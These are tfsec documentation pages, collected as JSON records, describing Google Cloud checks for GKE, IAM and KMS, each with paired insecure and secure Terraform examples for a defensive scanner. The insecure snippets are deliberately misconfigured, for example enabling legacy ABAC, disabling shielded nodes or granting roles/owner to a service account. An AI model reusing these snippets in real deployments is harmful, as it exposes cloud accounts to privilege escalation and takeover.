{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/google/gke/node-pool-uses-cos/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/google/gke/node-pool-uses-cos/index.md", "content": "---\ntitle: Ensure Container-Optimized OS (cos) is used for Kubernetes Engine Clusters Node image\n---\n\n# Ensure Container-Optimized OS (cos) is used for Kubernetes Engine Clusters Node image\n\n### Default Severity: <span class=\"severity low\">low</span>\n\n### Explanation\n\nGKE supports several OS image types but COS is the recommended OS image to use on cluster nodes for enhanced security\n\n### Possible Impact\nCOS is the recommended OS image to use on cluster nodes\n\n### Suggested Resolution\nUse the COS image type\n\n\n### Insecure Example\n\nThe following example will fail the google-gke-node-pool-uses-cos check.\n```terraform\n\n resource \"google_service_account\" \"default\" {\n   account_id   = \"service-account-id\"\n   display_name = \"Service Account\"\n }\n \n resource \"google_container_cluster\" \"primary\" {\n   name     = \"my-gke-cluster\"\n   location = \"us-central1\"\n \n   # We can't create a cluster with no node pool defined, but we want to only use\n   # separately managed node pools. So we create the smallest possible default\n   # node pool and immediately delete it.\n   remove_default_node_pool = true\n   initial_node_count       = 1\n }\n \n resource \"google_container_node_pool\" \"bad_example\" {\n   name       = \"my-node-pool\"\n   cluster    = google_container_cluster.primary.id\n   node_count = 1\n \n   node_config {\n     preemptible  = true\n     machine_type = \"e2-medium\"\n \n     # Google recommends custom service accounts that have cloud-platform scope and permissions granted via IAM Roles.\n     service_account = google_service_account.default.email\n     oauth_scopes = [\n       \"https://www.googleapis.com/auth/cloud-platform\"\n     ]\n     image_type = \"something\"\n   }\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the google-gke-node-pool-uses-cos check.\n```terraform\n\n resource \"google_service_account\" \"default\" {\n   account_id   = \"service-account-id\"\n   display_name = \"Service Account\"\n }\n \n resource \"google_container_cluster\" \"primary\" {\n   name     = \"my-gke-cluster\"\n   location = \"us-central1\"\n \n   # We can't create a cluster with no node pool defined, but we want to only use\n   # separately managed node pools. So we create the smallest possible default\n   # node pool and immediately delete it.\n   remove_default_node_pool = true\n   initial_node_count       = 1\n }\n \n resource \"google_container_node_pool\" \"good_example\" {\n   name       = \"my-node-pool\"\n   cluster    = google_container_cluster.primary.id\n   node_count = 1\n \n   node_config {\n     preemptible  = true\n     machine_type = \"e2-medium\"\n \n     # Google recommends custom service accounts that have cloud-platform scope and permissions granted via IAM Roles.\n     service_account = google_service_account.default.email\n     oauth_scopes = [\n       \"https://www.googleapis.com/auth/cloud-platform\"\n     ]\n     image_type = \"COS\"\n   }\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/container_node_pool#image_type](https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/container_node_pool#image_type){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:25:14.347672"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/google/gke/node-shielding-enabled/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/google/gke/node-shielding-enabled/index.md", "content": "---\ntitle: Shielded GKE nodes not enabled.\n---\n\n# Shielded GKE nodes not enabled.\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\nCIS GKE Benchmark Recommendation: 6.5.5. Ensure Shielded GKE Nodes are Enabled\n\nShielded GKE Nodes provide strong, verifiable node identity and integrity to increase the security of GKE nodes and should be enabled on all GKE clusters.\n\n### Possible Impact\nNode identity and integrity can't be verified without shielded GKE nodes\n\n### Suggested Resolution\nEnable node shielding\n\n\n### Insecure Example\n\nThe following example will fail the google-gke-node-shielding-enabled check.\n```terraform\n\n resource \"google_container_cluster\" \"bad_example\" {\n \tenable_shielded_nodes = \"false\"\n }\n```\n\n\n\n### Secure Example\n\nThe following example will pass the google-gke-node-shielding-enabled check.\n```terraform\n\n resource \"google_container_cluster\" \"good_example\" {\n \tenable_shielded_nodes = \"true\"\n }\n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/container_cluster#enable_shielded_nodes](https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/container_cluster#enable_shielded_nodes){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://cloud.google.com/kubernetes-engine/docs/how-to/hardening-your-cluster#shielded_nodes](https://cloud.google.com/kubernetes-engine/docs/how-to/hardening-your-cluster#shielded_nodes){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:25:14.736331"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/google/gke/use-cluster-labels/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/google/gke/use-cluster-labels/index.md", "content": "---\ntitle: Clusters should be configured with Labels\n---\n\n# Clusters should be configured with Labels\n\n### Default Severity: <span class=\"severity low\">low</span>\n\n### Explanation\n\nLabels make it easier to manage assets and differentiate between clusters and environments, allowing the mapping of computational resources to the wider organisational structure.\n\n### Possible Impact\nAsset management can be limited/more difficult\n\n### Suggested Resolution\nSet cluster resource labels\n\n\n### Insecure Example\n\nThe following example will fail the google-gke-use-cluster-labels check.\n```terraform\n\n resource \"google_service_account\" \"default\" {\n   account_id   = \"service-account-id\"\n   display_name = \"Service Account\"\n }\n \n resource \"google_container_cluster\" \"bad_example\" {\n   name     = \"my-gke-cluster\"\n   location = \"us-central1\"\n \n   # We can't create a cluster with no node pool defined, but we want to only use\n   # separately managed node pools. So we create the smallest possible default\n   # node pool and immediately delete it.\n   remove_default_node_pool = true\n   initial_node_count       = 1\n }\n \n resource \"google_container_node_pool\" \"primary_preemptible_nodes\" {\n   name       = \"my-node-pool\"\n   location   = \"us-central1\"\n   cluster    = google_container_cluster.primary.name\n   node_count = 1\n \n   node_config {\n     preemptible  = true\n     machine_type = \"e2-medium\"\n \n     # Google recommends custom service accounts that have cloud-platform scope and permissions granted via IAM Roles.\n     service_account = google_service_account.default.email\n     oauth_scopes    = [\n       \"https://www.googleapis.com/auth/cloud-platform\"\n     ]\n   }\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the google-gke-use-cluster-labels check.\n```terraform\n\n resource \"google_service_account\" \"default\" {\n   account_id   = \"service-account-id\"\n   display_name = \"Service Account\"\n }\n \n resource \"google_container_cluster\" \"good_example\" {\n   name     = \"my-gke-cluster\"\n   location = \"us-central1\"\n \n   # We can't create a cluster with no node pool defined, but we want to only use\n   # separately managed node pools. So we create the smallest possible default\n   # node pool and immediately delete it.\n   remove_default_node_pool = true\n   initial_node_count       = 1\n   resource_labels = {\n     \"env\" = \"staging\"\n   }\n }\n \n resource \"google_container_node_pool\" \"primary_preemptible_nodes\" {\n   name       = \"my-node-pool\"\n   location   = \"us-central1\"\n   cluster    = google_container_cluster.primary.name\n   node_count = 1\n \n   node_config {\n     preemptible  = true\n     machine_type = \"e2-medium\"\n \n     # Google recommends custom service accounts that have cloud-platform scope and permissions granted via IAM Roles.\n     service_account = google_service_account.default.email\n     oauth_scopes    = [\n       \"https://www.googleapis.com/auth/cloud-platform\"\n     ]\n   }\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/container_cluster#resource_labels](https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/container_cluster#resource_labels){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:25:15.007415"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/google/gke/use-rbac-permissions/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/google/gke/use-rbac-permissions/index.md", "content": "---\ntitle: Legacy ABAC permissions are enabled.\n---\n\n# Legacy ABAC permissions are enabled.\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\nYou should disable Attribute-Based Access Control (ABAC), and instead use Role-Based Access Control (RBAC) in GKE.\n\nRBAC has significant security advantages and is now stable in Kubernetes, so it’s time to disable ABAC.\n\n### Possible Impact\nABAC permissions are less secure than RBAC permissions\n\n### Suggested Resolution\nSwitch to using RBAC permissions\n\n\n### Insecure Example\n\nThe following example will fail the google-gke-use-rbac-permissions check.\n```terraform\n\n resource \"google_container_cluster\" \"bad_example\" {\n \tenable_legacy_abac = \"true\"\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the google-gke-use-rbac-permissions check.\n```terraform\n\n resource \"google_container_cluster\" \"good_example\" {\n \t# ...\n \t# enable_legacy_abac not set\n \t# ...\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/container_cluster#enable_legacy_abac](https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/container_cluster#enable_legacy_abac){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://cloud.google.com/kubernetes-engine/docs/how-to/hardening-your-cluster#leave_abac_disabled_default_for_110](https://cloud.google.com/kubernetes-engine/docs/how-to/hardening-your-cluster#leave_abac_disabled_default_for_110){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:25:15.294019"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/google/gke/use-service-account/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/google/gke/use-service-account/index.md", "content": "---\ntitle: Checks for service account defined for GKE nodes\n---\n\n# Checks for service account defined for GKE nodes\n\n### Default Severity: <span class=\"severity medium\">medium</span>\n\n### Explanation\n\nYou should create and use a minimally privileged service account to run your GKE cluster instead of using the Compute Engine default service account.\n\n### Possible Impact\nService accounts with wide permissions can increase the risk of compromise\n\n### Suggested Resolution\nUse limited permissions for service accounts to be effective\n\n\n### Insecure Example\n\nThe following example will fail the google-gke-use-service-account check.\n```terraform\n\n resource \"google_container_cluster\" \"bad_example\" {\n \tnode_config {\n \t}\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the google-gke-use-service-account check.\n```terraform\n\n resource \"google_container_cluster\" \"good_example\" {\n \tnode_config {\n \t\tservice_account = \"cool-service-account@example.com\"\n \t}\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/container_cluster#service_account](https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/container_cluster#service_account){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://cloud.google.com/kubernetes-engine/docs/how-to/hardening-your-cluster#use_least_privilege_sa](https://cloud.google.com/kubernetes-engine/docs/how-to/hardening-your-cluster#use_least_privilege_sa){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:25:15.564409"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/google/iam/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/google/iam/index.md", "content": "---\ntitle: iam\n---\n\n# iam\n\n## Checks\n\n\n- [no-default-network](no-default-network) Default network should not be created at project level\n\n- [no-folder-level-default-service-account-assignment](no-folder-level-default-service-account-assignment) Roles should not be assigned to default service accounts\n\n- [no-org-level-default-service-account-assignment](no-org-level-default-service-account-assignment) Roles should not be assigned to default service accounts\n\n- [no-org-level-service-account-impersonation](no-org-level-service-account-impersonation) Users should not be granted service account access at the organization level\n\n- [no-privileged-service-accounts](no-privileged-service-accounts) Service accounts should not have roles assigned with excessive privileges\n\n- [no-project-level-default-service-account-assignment](no-project-level-default-service-account-assignment) Roles should not be assigned to default service accounts\n\n- [no-project-level-service-account-impersonation](no-project-level-service-account-impersonation) Users should not be granted service account access at the project level\n\n- [no-user-granted-permissions](no-user-granted-permissions) IAM granted directly to user.\n\n\n\n", "timestamp": "2025-10-24T22:25:15.876580"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/google/iam/no-default-network/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/google/iam/no-default-network/index.md", "content": "---\ntitle: Default network should not be created at project level\n---\n\n# Default network should not be created at project level\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\nThe default network which is provided for a project contains multiple insecure firewall rules which allow ingress to the project's infrastructure. Creation of this network should therefore be disabled.\n\n### Possible Impact\nExposure of internal infrastructure/services to public internet\n\n### Suggested Resolution\nDisable automatic default network creation\n\n\n### Insecure Example\n\nThe following example will fail the google-iam-no-default-network check.\n```terraform\n\n resource \"google_project\" \"bad_example\" {\n   name       = \"My Project\"\n   project_id = \"your-project-id\"\n   org_id     = \"1234567\"\n   auto_create_network = true\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the google-iam-no-default-network check.\n```terraform\n\n resource \"google_project\" \"good_example\" {\n   name       = \"My Project\"\n   project_id = \"your-project-id\"\n   org_id     = \"1234567\"\n   auto_create_network = false\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/google_project#auto_create_network](https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/google_project#auto_create_network){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:25:16.144749"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/google/iam/no-folder-level-default-service-account-assignment/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/google/iam/no-folder-level-default-service-account-assignment/index.md", "content": "---\ntitle: Roles should not be assigned to default service accounts\n---\n\n# Roles should not be assigned to default service accounts\n\n### Default Severity: <span class=\"severity medium\">medium</span>\n\n### Explanation\n\nDefault service accounts should not be used - consider creating specialised service accounts for individual purposes.\n\n### Possible Impact\nViolation of principal of least privilege\n\n### Suggested Resolution\nUse specialised service accounts for specific purposes.\n\n\n### Insecure Example\n\nThe following example will fail the google-iam-no-folder-level-default-service-account-assignment check.\n```terraform\n\n resource \"google_folder_iam_member\" \"folder-123\" {\n \tfolder = \"folder-123\"\n \trole    = \"roles/whatever\"\n \tmember  = \"123-compute@developer.gserviceaccount.com\"\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the google-iam-no-folder-level-default-service-account-assignment check.\n```terraform\n\n resource \"google_service_account\" \"test\" {\n \taccount_id   = \"account123\"\n \tdisplay_name = \"account123\"\n }\n \t\t\t  \n resource \"google_folder_iam_member\" \"folder-123\" {\n \tfolder = \"folder-123\"\n \trole    = \"roles/whatever\"\n \tmember  = \"serviceAccount:${google_service_account.test.email}\"\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/google_folder_iam](https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/google_folder_iam){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [](){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [](){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:25:16.410499"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/google/iam/no-folder-level-service-account-impersonation/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/google/iam/no-folder-level-service-account-impersonation/index.md", "content": "---\ntitle: Users should not be granted service account access at the folder level\n---\n\n# Users should not be granted service account access at the folder level\n\n### Default Severity: <span class=\"severity medium\">medium</span>\n\n### Explanation\n\nUsers with service account access at folder level can impersonate any service account. Instead, they should be given access to particular service accounts as required.\n\n### Possible Impact\nPrivilege escalation, impersonation of any/all services\n\n### Suggested Resolution\nProvide access at the service-level instead of folder-level, if required\n\n\n### Insecure Example\n\nThe following example will fail the google-iam-no-folder-level-service-account-impersonation check.\n```terraform\n\n resource \"google_folder_iam_binding\" \"folder-123\" {\n \tfolder = \"folder-123\"\n \trole    = \"roles/iam.serviceAccountUser\"\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the google-iam-no-folder-level-service-account-impersonation check.\n```terraform\n\n resource \"google_folder_iam_binding\" \"folder-123\" {\n \tfolder = \"folder-123\"\n \trole    = \"roles/nothingInParticular\"\n }\n \t\t\t\n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/google_folder_iam](https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/google_folder_iam){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://cloud.google.com/iam/docs/impersonating-service-accounts](https://cloud.google.com/iam/docs/impersonating-service-accounts){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:25:16.685442"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/google/iam/no-org-level-default-service-account-assignment/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/google/iam/no-org-level-default-service-account-assignment/index.md", "content": "---\ntitle: Roles should not be assigned to default service accounts\n---\n\n# Roles should not be assigned to default service accounts\n\n### Default Severity: <span class=\"severity medium\">medium</span>\n\n### Explanation\n\nDefault service accounts should not be used - consider creating specialised service accounts for individual purposes.\n\n### Possible Impact\nViolation of principal of least privilege\n\n### Suggested Resolution\nUse specialised service accounts for specific purposes.\n\n\n### Insecure Example\n\nThe following example will fail the google-iam-no-org-level-default-service-account-assignment check.\n```terraform\n\n resource \"google_organization_iam_member\" \"org-123\" {\n \torg_id = \"organization-123\"\n \trole    = \"roles/whatever\"\n \tmember  = \"123-compute@developer.gserviceaccount.com\"\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the google-iam-no-org-level-default-service-account-assignment check.\n```terraform\n\n resource \"google_service_account\" \"test\" {\n \taccount_id   = \"account123\"\n \tdisplay_name = \"account123\"\n }\n \t\t\t  \n resource \"google_organization_iam_member\" \"org-123\" {\n \torg_id = \"org-123\"\n \trole    = \"roles/whatever\"\n \tmember  = \"serviceAccount:${google_service_account.test.email}\"\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/google_organization_iam](https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/google_organization_iam){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [](){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [](){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:25:16.972030"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/google/iam/no-org-level-service-account-impersonation/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/google/iam/no-org-level-service-account-impersonation/index.md", "content": "---\ntitle: Users should not be granted service account access at the organization level\n---\n\n# Users should not be granted service account access at the organization level\n\n### Default Severity: <span class=\"severity medium\">medium</span>\n\n### Explanation\n\nUsers with service account access at organization level can impersonate any service account. Instead, they should be given access to particular service accounts as required.\n\n### Possible Impact\nPrivilege escalation, impersonation of any/all services\n\n### Suggested Resolution\nProvide access at the service-level instead of organization-level, if required\n\n\n### Insecure Example\n\nThe following example will fail the google-iam-no-org-level-service-account-impersonation check.\n```terraform\n\n resource \"google_organization_iam_binding\" \"organization-123\" {\n \torg_id  = \"org-123\"\n \trole    = \"roles/iam.serviceAccountUser\"\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the google-iam-no-org-level-service-account-impersonation check.\n```terraform\n\n resource \"google_organization_iam_binding\" \"organization-123\" {\n \torg_id  = \"org-123\"\n \trole    = \"roles/nothingInParticular\"\n }\n \t\t\t\n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/google_organization_iam](https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/google_organization_iam){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://cloud.google.com/iam/docs/impersonating-service-accounts](https://cloud.google.com/iam/docs/impersonating-service-accounts){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:25:17.223554"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/google/iam/no-privileged-service-accounts/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/google/iam/no-privileged-service-accounts/index.md", "content": "---\ntitle: Service accounts should not have roles assigned with excessive privileges\n---\n\n# Service accounts should not have roles assigned with excessive privileges\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\nService accounts should have a minimal set of permissions assigned in order to do their job. They should never have excessive access as if compromised, an attacker can escalate privileges and take over the entire account.\n\n### Possible Impact\nCloud account takeover if a resource using a service account is compromised\n\n### Suggested Resolution\nLimit service account access to minimal required set\n\n\n### Insecure Example\n\nThe following example will fail the google-iam-no-privileged-service-accounts check.\n```terraform\n\n resource \"google_service_account\" \"test\" {\n   account_id   = \"account123\"\n   display_name = \"account123\"\n   email        = \"jim@tfsec.dev\"\n }\n \n resource \"google_project_iam_member\" \"project\" {\n \tproject = \"your-project-id\"\n \trole    = \"roles/owner\"\n \tmember  = \"serviceAccount:${google_service_account.test.email}\"\n }\n \t\t\t\n```\n\n\n\n### Secure Example\n\nThe following example will pass the google-iam-no-privileged-service-accounts check.\n```terraform\n\n resource \"google_service_account\" \"test\" {\n \taccount_id   = \"account123\"\n \tdisplay_name = \"account123\"\n    email        = \"jim@tfsec.dev\"\n }\n \n resource \"google_project_iam_member\" \"project\" {\n \tproject = \"your-project-id\"\n \trole    = \"roles/logging.logWriter\"\n \tmember  = \"serviceAccount:${google_service_account.test.email}\"\n }\n \t\t\t\n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/google_project_iam](https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/google_project_iam){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://cloud.google.com/iam/docs/understanding-roles](https://cloud.google.com/iam/docs/understanding-roles){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:25:17.500731"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/google/iam/no-project-level-default-service-account-assignment/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/google/iam/no-project-level-default-service-account-assignment/index.md", "content": "---\ntitle: Roles should not be assigned to default service accounts\n---\n\n# Roles should not be assigned to default service accounts\n\n### Default Severity: <span class=\"severity medium\">medium</span>\n\n### Explanation\n\nDefault service accounts should not be used - consider creating specialised service accounts for individual purposes.\n\n### Possible Impact\nViolation of principal of least privilege\n\n### Suggested Resolution\nUse specialised service accounts for specific purposes.\n\n\n### Insecure Example\n\nThe following example will fail the google-iam-no-project-level-default-service-account-assignment check.\n```terraform\n\n resource \"google_project_iam_member\" \"project-123\" {\n \tproject = \"project-123\"\n \trole    = \"roles/whatever\"\n \tmember  = \"123-compute@developer.gserviceaccount.com\"\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the google-iam-no-project-level-default-service-account-assignment check.\n```terraform\n\n resource \"google_service_account\" \"test\" {\n \taccount_id   = \"account123\"\n \tdisplay_name = \"account123\"\n }\n \t\t\t  \n resource \"google_project_iam_member\" \"project-123\" {\n \tproject = \"project-123\"\n \trole    = \"roles/whatever\"\n \tmember  = \"serviceAccount:${google_service_account.test.email}\"\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/google_project_iam](https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/google_project_iam){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [](){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [](){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:25:17.759995"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/google/iam/no-project-level-service-account-impersonation/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/google/iam/no-project-level-service-account-impersonation/index.md", "content": "---\ntitle: Users should not be granted service account access at the project level\n---\n\n# Users should not be granted service account access at the project level\n\n### Default Severity: <span class=\"severity medium\">medium</span>\n\n### Explanation\n\nUsers with service account access at project level can impersonate any service account. Instead, they should be given access to particular service accounts as required.\n\n### Possible Impact\nPrivilege escalation, impersonation of any/all services\n\n### Suggested Resolution\nProvide access at the service-level instead of project-level, if required\n\n\n### Insecure Example\n\nThe following example will fail the google-iam-no-project-level-service-account-impersonation check.\n```terraform\n\n resource \"google_project_iam_binding\" \"project-123\" {\n \tproject = \"project-123\"\n \trole    = \"roles/iam.serviceAccountUser\"\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the google-iam-no-project-level-service-account-impersonation check.\n```terraform\n\n resource \"google_project_iam_binding\" \"project-123\" {\n \tproject = \"project-123\"\n \trole    = \"roles/nothingInParticular\"\n }\n \t\t\t\n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/google_project_iam](https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/google_project_iam){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://cloud.google.com/iam/docs/impersonating-service-accounts](https://cloud.google.com/iam/docs/impersonating-service-accounts){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:25:18.057131"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/google/iam/no-user-granted-permissions/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/google/iam/no-user-granted-permissions/index.md", "content": "---\ntitle: IAM granted directly to user.\n---\n\n# IAM granted directly to user.\n\n### Default Severity: <span class=\"severity medium\">medium</span>\n\n### Explanation\n\nPermissions should not be directly granted to users, you identify roles that contain the appropriate permissions, and then grant those roles to the user. \n\nGranting permissions to users quickly become unwieldy and complex to make large scale changes to remove access to a particular resource.\n\nPermissions should be granted on roles, groups, services accounts instead.\n\n### Possible Impact\nUsers shouldn't have permissions granted to them directly\n\n### Suggested Resolution\nRoles should be granted permissions and assigned to users\n\n\n### Insecure Example\n\nThe following example will fail the google-iam-no-user-granted-permissions check.\n```terraform\n\n resource \"google_project_iam_binding\" \"bad_example\" {\n \tmembers = [\n \t\t\"user:test@example.com\",\n \t\t]\n }\n \n resource \"google_project_iam_member\" \"bad_example\" {\n \tmember = \"user:test@example.com\"\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the google-iam-no-user-granted-permissions check.\n```terraform\n\n resource \"google_project_iam_binding\" \"good_example\" {\n \tmembers = [\n \t\t\"group:test@example.com\",\n \t\t]\n }\n \n resource \"google_storage_bucket_iam_member\" \"good_example\" {\n \tmember = \"serviceAccount:test@example.com\"\n }\n```\n\n\n\n### Links\n\n\n- [https://www.terraform.io/docs/providers/google/d/iam_policy.html#members](https://www.terraform.io/docs/providers/google/d/iam_policy.html#members){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://cloud.google.com/iam/docs/overview#permissions](https://cloud.google.com/iam/docs/overview#permissions){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://cloud.google.com/resource-manager/reference/rest/v1/projects/setIamPolicy](https://cloud.google.com/resource-manager/reference/rest/v1/projects/setIamPolicy){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:25:18.329277"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/google/kms/rotate-kms-keys/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/google/kms/rotate-kms-keys/index.md", "content": "---\ntitle: KMS keys should be rotated at least every 90 days\n---\n\n# KMS keys should be rotated at least every 90 days\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\nKeys should be rotated on a regular basis to limit exposure if a given key should become compromised.\n\n### Possible Impact\nExposure is greater if the same keys are used over a long period\n\n### Suggested Resolution\nSet key rotation period to 90 days\n\n\n### Insecure Example\n\nThe following example will fail the google-kms-rotate-kms-keys check.\n```terraform\n\n resource \"google_kms_key_ring\" \"keyring\" {\n   name     = \"keyring-example\"\n   location = \"global\"\n }\n \n resource \"google_kms_crypto_key\" \"example-key\" {\n   name            = \"crypto-key-example\"\n   key_ring        = google_kms_key_ring.keyring.id\n   rotation_period = \"15552000s\"\n \n   lifecycle {\n     prevent_destroy = true\n   }\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the google-kms-rotate-kms-keys check.\n```terraform\n\n resource \"google_kms_key_ring\" \"keyring\" {\n   name     = \"keyring-example\"\n   location = \"global\"\n }\n \n resource \"google_kms_crypto_key\" \"example-key\" {\n   name            = \"crypto-key-example\"\n   key_ring        = google_kms_key_ring.keyring.id\n   rotation_period = \"7776000s\"\n \n   lifecycle {\n     prevent_destroy = true\n   }\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/kms_crypto_key#rotation_period](https://registry.terraform.io/providers/hashicorp/google/latest/docs/resources/kms_crypto_key#rotation_period){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:25:19.011300"}
